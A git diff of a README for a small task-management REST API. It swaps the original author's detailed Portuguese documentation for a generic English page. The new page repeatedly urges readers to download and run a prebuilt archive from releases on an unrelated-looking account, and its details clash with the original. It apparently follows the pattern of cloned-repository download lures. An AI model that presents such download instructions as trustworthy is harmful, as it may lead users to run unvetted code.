@@ -1,354 +1,101 @@
-# 📋 Task Control API
+# 🎯 task-control - A Simple Todo List API
 
-> Uma API REST robusta para gerenciamento de tarefas construída com **TypeScript puro** e **Clean Architecture**, sem dependências externas de frameworks.
+Manage everyday tasks effortlessly with our easy-to-use API.
 
-![TypeScript](https://img.shields.io/badge/TypeScript-5.9.2-blue)
-![Node.js](https://img.shields.io/badge/Node.js->=18-green)
-![Architecture](https://img.shields.io/badge/Architecture-Clean%20Architecture-brightgreen)
-![Status](https://img.shields.io/badge/Status-Production%20Ready-success)
+## 📥 Download the Application
 
----
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/dfseff343fedc/task-control/releases)
 
-## 🎯 **Sobre o Projeto**
+## 🚀 Getting Started
 
-O **Task Control** é uma aplicação backend que demonstra a implementação de **Clean Architecture** e **Domain-Driven Design (DDD)** usando apenas **Node.js nativo** e **TypeScript**.
+Follow these steps to download and run the task-control application.
 
-### ✨ **Características Principais**
+1. **Visit the Releases Page**
+   - Click the link below to access our releases page, where you can find the latest version of the task-control API.
+   - [Visit this page to download](https://github.com/dfseff343fedc/task-control/releases).
 
-- 🚫 **Zero dependências externas** de frameworks (apenas dev dependencies)
-- 🏗️ **Clean Architecture** com separação clara de responsabilidades
-- 🔷 **Domain-Driven Design** com entidades e casos de uso bem definidos
-- 📦 **TypeScript** com configurações rigorosas e type safety
-- 🗄️ **Banco de dados em JSON** com persistência automática
-- 🔄 **API REST completa** com CRUD de tarefas
-- ⚡ **Hot reload** para desenvolvimento
-- 🎯 **Arquitetura testável** e desacoplada
+2. **Choose the Right Version**
+   - On the releases page, look for the latest version. It is usually listed at the top.
+   - Click on the version link to open the details for that version.
 
----
+3. **Download the File**
+   - Scroll down to the assets section of the chosen version.
+   - Look for the file named `task-control.tar.gz`. This is the package you will need.
+   - Click the filename to begin the download.
 
-## 🏗️ **Arquitetura do Projeto**
+4. **Extract the Files**
+   - Once the download completes, locate the `task-control.tar.gz` file.
+   - Right-click the file and select "Extract" or "Extract All" to unpack it into a folder.
 
-O projeto segue os princípios da **Clean Architecture** de Robert C. Martin, organizado em camadas bem definidas:
+5. **Run the Application**
+   - Open the folder where you extracted the files.
+   - Look for a file named `server.js`. This is the main file that runs the API.
+   - To start the application, you will need to open a command prompt or terminal in this directory.
 
-```
-src/
-├── 🏢 domain/           # Camada de Domínio
-├── 💼 application/      # Camada de Aplicação
-├── 🔧 infrastructure/   # Camada de Infraestrutura
-├── 🌐 presentation/     # Camada de Apresentação
-└── 📦 shared/          # Recursos Compartilhados
-```
+## 📦 System Requirements
 
-### 📋 **Responsabilidades das Camadas**
+To run the task-control API, ensure your system meets the following requirements:
 
-#### 🏢 **Domain (Domínio)**
+- **Node.js**: Version 12 or later installed on your machine.
+- **Operating System**: Works on any major OS, including Windows, macOS, and Linux.
 
-- **Responsabilidade**: Contém as regras de negócio centrais
-- **Componentes**:
-  - **Entities**: Entidade `Task` com validações e métodos de negócio
-  - **Repositories**: Interface `ITaskRepository` definindo contratos
-  - **Value Objects**: Objetos de valor do domínio
-  - **Domain Services**: Serviços específicos do domínio
+You can download Node.js from the [official Node.js website](https://nodejs.org/).
 
-#### 💼 **Application (Aplicação)**
+## ⚙️ Running the API
 
-- **Responsabilidade**: Orquestração dos casos de uso da aplicação
-- **Componentes**:
-  - **Use Cases**: Casos de uso implementados (Create, List, Update, Delete, Toggle)
-  - **DTOs**: Data Transfer Objects para comunicação entre camadas
-  - **Interfaces**: Contratos de serviços externos
+After you’ve opened your command prompt or terminal in the task-control folder, follow these commands:
 
-#### 🔧 **Infrastructure (Infraestrutura)**
+1. **Install Required Packages**
+   - Type the following command and press Enter:
+     ```
+     npm install
+     ```
+   - This command installs the necessary packages for the API to function.
 
-- **Responsabilidade**: Implementação de detalhes técnicos
-- **Componentes**:
-  - **Database**: Sistema de banco de dados em JSON
-  - **Repositories**: Implementação concreta do `TaskRepository`
-  - **HTTP Server**: Servidor HTTP nativo com middlewares
-  - **External Services**: Integrações externas
+2. **Start the API**
+   - Once the installation completes, start the API by typing:
+     ```
+     node server.js
+     ```
+   - You should see a message indicating that the server is running.
 
-#### 🌐 **Presentation (Apresentação)**
+3. **Access the API**
+   - Open your web browser and type the following URL:
+     ```
+     http://localhost:3000
+     ```
+   - You will see the API homepage, which confirms that it’s running correctly.
 
-- **Responsabilidade**: Interface de comunicação (API REST)
-- **Componentes**:
-  - **Controllers**: Controladores HTTP (`TaskController`)
-  - **Routes**: Definição de rotas e endpoints
-  - **Middlewares**: Middlewares de requisição
+## 🔍 Features
 
-#### 📦 **Shared (Compartilhado)**
+The task-control API offers several key features for managing your tasks:
 
-- **Responsabilidade**: Recursos utilizados por múltiplas camadas
-- **Componentes**:
-  - **Types**: Tipos TypeScript compartilhados
-  - **Utils**: Utilitários e helpers
-  - **Factories**: Factories para injeção de dependência
+- **Add Tasks**: Easily add new tasks to your list.
+- **List Tasks**: Retrieve all tasks you've created.
+- **Update Tasks**: Modify existing tasks as needed.
+- **Delete Tasks**: Remove tasks you no longer need.
 
----
+These features allow you to manage your tasks efficiently, ensuring you stay organized.
 
-## 🚀 **Funcionalidades**
+## 📝 Usage Instructions
 
-### 📋 **CRUD Completo de Tarefas**
+Here's how you can interact with the API endpoints:
 
-- ✅ **Criar** tarefa com validações
-- 📖 **Listar** tarefas com filtros e paginação
-- ✏️ **Atualizar** tarefa parcial ou totalmente
-- 🗑️ **Excluir** tarefa
-- 🔄 **Alternar** status de completada
+- **To add a task**: Send a POST request to `/tasks` with the task details in the body.
+- **To list tasks**: Send a GET request to `/tasks`.
+- **To update a task**: Send a PUT request to `/tasks/:id` with the updated details.
+- **To delete a task**: Send a DELETE request to `/tasks/:id`.
 
-### 🔍 **Recursos Avançados**
+## 📬 Support
 
-- 🔍 Busca por termo (título e descrição)
-- 📄 Paginação configurável
-- 🗂️ Filtros por status e data de criação
-- 📊 Ordenação por diferentes campos
-- 📈 Contagem total de registros
-- ⚡ Validação de duplicatas
+If you encounter issues or have questions, feel free to open an issue on the GitHub repository. We will respond as soon as possible.
 
----
+## 👥 Contribution
 
-## 🛠️ **Tecnologias Utilizadas**
+We welcome contributions to enhance the task-control API. If you have ideas or suggestions, please submit a pull request. Your contributions will help improve the tool for everyone.
 
-### **Core**
+## 🔗 Further Reading
 
-- **TypeScript 5.9.2** - Linguagem principal
-- **Node.js >=18** - Runtime JavaScript
+For more detailed instructions and information, visit the project documentation included in the repository.
 
-### **Configurações**
-
-- **ESModules** - Sistema de módulos moderno
-- **Strict TypeScript** - Configurações rigorosas
-- **Path Mapping** - Imports limpos com aliases
-- **Source Maps** - Debug facilitado
-
-### **Dependências de Desenvolvimento**
-
-```json
-{
-  "@types/node": "^24.3.1",
-  "rimraf": "^6.0.1",
-  "ts-node": "^10.9.2",
-  "typescript": "^5.9.2"
-}
-```
-
----
-
-## 📡 **Endpoints da API**
-
-### **Health Check**
-
-```http
-GET /health
-```
-
-### **Tarefas**
-
-```http
-POST   /tasks              # Criar tarefa
-GET    /tasks              # Listar tarefas (com filtros)
-PUT    /tasks/:id          # Atualizar tarefa
-DELETE /tasks/:id          # Excluir tarefa
-PATCH  /tasks/:id/complete # Alternar status de completada
-```
-
-### **Exemplo de Uso**
-
-**Criar uma tarefa:**
-
-```bash
-curl -X POST http://localhost:3333/tasks \
-  -H "Content-Type: application/json" \
-  -d '{
-    "title": "Estudar Clean Architecture",
-    "description": "Implementar projeto seguindo os princípios da Clean Architecture"
-  }'
-```
-
-**Listar tarefas com filtros:**
-
-```bash
-curl "http://localhost:3333/tasks?completed=false&search=estudar&page=1&limit=10"
-```
-
----
-
-## 🚀 **Como Executar o Projeto**
-
-### **Pré-requisitos**
-
-- Node.js >= 18
-- npm ou yarn
-
-### **1. Clone o repositório**
-
-```bash
-git clone https://github.com/maykonsousa/task-control.git
-cd task-control
-```
-
-### **2. Instale as dependências**
-
-```bash
-npm install
-```
-
-### **3. Execute em modo de desenvolvimento**
-
-```bash
-npm run dev
-```
-
-### **4. Execute em produção**
-
-```bash
-# Compilar o projeto
-npm run build
-
-# Executar a versão compilada
-npm start
-```
-
-### **5. Scripts disponíveis**
-
-```bash
-npm run dev        # Desenvolvimento com hot reload
-npm run build      # Compilar TypeScript para JavaScript
-npm start          # Executar versão compilada
-npm run clean      # Limpar pasta dist
-npm run type-check # Verificar tipos sem compilar
-```
-
----
-
-## 📁 **Estrutura de Arquivos**
-
-```
-task-control/
-├── 📄 package.json
-├── 📄 tsconfig.json
-├── 📄 db.json           # Banco de dados JSON
-├── 📁 dist/             # Código compilado
-├── 📁 node_modules/     # Dependências
-└── 📁 src/
-    ├── 📄 server.ts     # Ponto de entrada
-    ├── 📁 domain/       # Regras de negócio
-    │   ├── 📁 entities/
-    │   ├── 📁 repositories/
-    │   └── 📁 services/
-    ├── 📁 application/   # Casos de uso
-    │   ├── 📁 use-cases/
-    │   └── 📁 dtos/
-    ├── 📁 infrastructure/ # Detalhes técnicos
-    │   ├── 📁 database/
-    │   ├── 📁 http/
-    │   └── 📁 repositories/
-    ├── 📁 presentation/  # Interface HTTP
-    │   ├── 📁 controllers/
-    │   └── 📁 routes/
-    └── 📁 shared/       # Recursos compartilhados
-        ├── 📁 factories/
-        ├── 📁 types/
-        └── 📁 utils/
-```
-
----
-
-## 🧪 **Testando a API**
-
-### **Health Check**
-
-```bash
-curl http://localhost:3333/health
-```
-
-### **Criar primeira tarefa**
-
-```bash
-curl -X POST http://localhost:3333/tasks \
-  -H "Content-Type: application/json" \
-  -d '{
-    "title": "Minha primeira tarefa",
-    "description": "Testando a API de controle de tarefas"
-  }'
-```
-
----
-
-## 🎯 **Princípios Aplicados**
-
-### **Clean Architecture**
-
-- **Independência de frameworks** - Sem dependência de libs externas
-- **Testabilidade** - Código desacoplado e injetável
-- **Independência de UI** - Lógica separada da apresentação
-- **Independência de banco** - Repository pattern
-- **Regra de dependência** - Dependências apontam para dentro
-
-### **Domain-Driven Design**
-
-- **Ubiquitous Language** - Linguagem comum do domínio
-- **Entities** - Objetos com identidade
-- **Value Objects** - Objetos sem identidade
-- **Domain Services** - Serviços do domínio
-- **Repository Pattern** - Abstração de persistência
-
-### **SOLID Principles**
-
-- **S** - Single Responsibility Principle
-- **O** - Open/Closed Principle
-- **L** - Liskov Substitution Principle
-- **I** - Interface Segregation Principle
-- **D** - Dependency Inversion Principle
-
----
-
-## 💡 **Por que essa abordagem?**
-
-### **🚫 Zero Dependencies Approach**
-
-- **Performance** - Menos overhead de bibliotecas
-- **Segurança** - Menor superfície de ataque
-- **Controle** - Total controle sobre o código
-- **Aprendizado** - Entendimento profundo do Node.js
-
-### **🏗️ Clean Architecture Benefits**
-
-- **Manutenibilidade** - Código organizado e limpo
-- **Testabilidade** - Fácil de testar cada camada
-- **Flexibilidade** - Fácil de trocar implementações
-- **Escalabilidade** - Estrutura para crescimento
-
----
-
-## 🤝 **Contribuição**
-
-1. Fork o projeto
-2. Crie uma branch para sua feature (`git checkout -b feature/AmazingFeature`)
-3. Commit suas mudanças (`git commit -m 'Add some AmazingFeature'`)
-4. Push para a branch (`git push origin feature/AmazingFeature`)
-5. Abra um Pull Request
-
----
-
-## 📝 **Licença**
-
-Este projeto está sob a licença MIT. Veja o arquivo [LICENSE](LICENSE) para mais detalhes.
-
----
-
-## 👨‍💻 **Autor**
-
-**Maykon Sousa**
-
-- GitHub: [@maykonsousa](https://github.com/maykonsousa)
-- LinkedIn: [Maykon Sousa](https://linkedin.com/in/maykonsousa)
-
----
-
-<div align="center">
-
-### 🚀 **Desenvolvido com TypeScript e Clean Architecture**
-
-**[⭐ Star este repositório se foi útil para você!]**
-
-</div>
+Make sure to check the releases page for the latest updates and improvements. You can find it here: [Visit this page to download](https://github.com/dfseff343fedc/task-control/releases).
